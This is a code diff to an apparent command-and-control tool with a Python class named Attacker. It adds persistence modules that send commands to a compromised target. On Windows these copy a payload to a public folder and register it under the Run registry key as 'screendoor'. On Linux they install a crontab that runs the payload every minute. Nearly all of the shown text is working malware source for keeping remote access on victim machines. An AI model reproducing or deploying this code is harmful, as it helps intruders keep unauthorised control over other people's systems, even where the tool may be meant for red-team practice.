@@ -23,20 +23,44 @@ class Attacker:
                 selected_method_id = input("Enter the number of the method you want to use : ")
                 print("")
             if selected_method_id == "1":
-                self.persist_scheduled_task()
+                self.persist_scheduled_task(server, target)
             elif selected_method_id == "2":
-                self.persist_registry_key()
+                self.persist_registry_key(server, target)
             elif selected_method_id == "3":
                 print("Cancelling... \n")
         else:
-            # TODO implement Linux peristence
-            pass
+            self.persist_crontab(server, target)
 
-    def persist_scheduled_task(self):
-        pass
+    def persist_scheduled_task(self, server, target):
+        # TODO implement scheduled tasks persistence method
+        print("[-] This method has not been implemented yet.\n")
 
-    def persist_registry_key(self):
-        pass
+    def persist_registry_key(self, server, target):
+        # TODO handle automation of payload name variable + name errors
+        payload_name = input("Enter payload name : ")
+        try:
+            persistence_command = f"cmd.exe /c copy {payload_name} C:\\Users\\Public"
+            server.send_message(target.id, persistence_command)
+            persistence_command = f"reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v screendoor /t REG_SZ /d C:\\Users\\Public\\{payload_name}"
+            server.send_message(target.id, persistence_command)
+            print("\n[+] Persistence achieved.\n")
+            print("[!] Don't forget to run this command to clean up registry :")
+            print("     \___ reg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v screendoor /f\n")
+        except Exception as err:
+            print(f"[-] Error : {err}\n")
+
+    def persist_crontab(self, server, target):
+        # TODO handle automation of payload name variable + name errors
+        payload_name = input("Enter payload name : ")
+        try:
+            persistence_command = f"echo '*/1 * * * * python3 /home/{target.user}/{payload_name}' | crontab -"
+            server.send_message(target.id, persistence_command)
+            print("\n[+] Persistence achieved.\n")
+            print("[!] Don't forget to run this command to clean up the crontab :")
+            print("     \___ crontab -r\n")
+        except Exception as err:
+            print(f"[-] Error : {err}\n")
+
 
     def winplant(self, server):
         random_chars = []
